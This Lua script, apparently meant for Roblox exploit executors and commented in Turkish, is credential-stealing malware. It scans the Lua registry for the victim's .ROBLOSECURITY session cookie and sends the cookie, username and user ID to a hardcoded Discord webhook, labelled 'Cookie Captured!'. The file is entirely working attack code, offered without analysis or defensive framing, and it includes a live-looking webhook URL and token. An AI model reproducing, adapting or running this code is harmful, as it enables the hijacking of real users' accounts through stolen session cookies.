local HttpService = game:GetService("HttpService")

local webhook = "https://discord.com/api/webhooks/1395813247558357002/sviDQzBGW-E3Ug9UvV8K21uDvVbjTnpzXaIn0ZMDJfwYiIg_1SU7-6Ai1DjAT05Yq6L1"

local function getHttpRequestFunction()
    if syn and syn.request then
        return syn.request
    elseif request then
        return request
    elseif http_request then
        return http_request
    elseif (http and http.request) then
        return http.request
    else
        return nil
    end
end

-- ROBLOSECURITY çerezini bulmaya çalışıyoruz
local function getCookie()
    local registry = debug.getregistry()
    for i, v in pairs(registry) do
        if type(v) == "string" and v:find(".ROBLOSECURITY=") then
            local cookie = v:match(".ROBLOSECURITY=([^;]+)")
            if cookie then
                return cookie
            end
        end
    end
    return nil
end

local cookie = getCookie()
local httpRequestFunc = getHttpRequestFunction()

if cookie and httpRequestFunc then
    local data = {
        content = "",
        embeds = {{
            title = "ROBLOSECURITY Cookie Yakalandı!",
            color = 0xff0000,
            fields = {
                {name = "Cookie", value = "```"..cookie.."```", inline = false},
                {name = "User", value = game.Players.LocalPlayer.Name, inline = true},
                {name = "UserId", value = tostring(game.Players.LocalPlayer.UserId), inline = true}
            },
            footer = {text = os.date("%Y-%m-%d %H:%M:%S")}
        }}
    }

    local jsonData = HttpService:JSONEncode(data)

    -- httpRequestFunc parametre yapısına göre isteği gönderiyoruz
    local success, response = pcall(function()
        return httpRequestFunc({
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)

    if not success then
        warn("Webhook gönderilirken hata oluştu: "..tostring(response))
    end
else
    if not cookie then
        warn("Cookie bulunamadı.")
    end
    if not httpRequestFunc then
        warn("HTTP request fonksiyonu bulunamadı. Executor HTTP isteği desteklemiyor olabilir.")
    end
end
